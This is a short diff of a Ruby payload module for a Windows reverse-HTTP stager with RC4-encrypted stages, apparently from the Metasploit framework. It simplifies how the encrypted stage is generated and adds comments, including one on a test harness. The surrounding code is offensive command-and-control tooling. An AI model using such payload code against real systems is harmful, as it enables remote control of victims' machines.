@@ -132,22 +132,20 @@ module Payload::Windows::ReverseHttpRc4
     asm
   end
 
+  #
+  # Return RC4 encrypted stage sans the xor'ed segment
+  #
   def generate_stage(opts={})
-    p = super(opts)
-    xorkey,rc4key = rc4_keys(datastore['RC4PASSWORD'])
-    c1 = OpenSSL::Cipher::Cipher.new('RC4')
-    c1.decrypt
-    c1.key = rc4key
-    p = c1.update(p)
-    p
+    super(opts)[4..-1]
   end
-  
+
 end
 
 end
 
 =begin
 
+# Test harness, remove prior to PR upstream:
 
 opts ={}
 xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
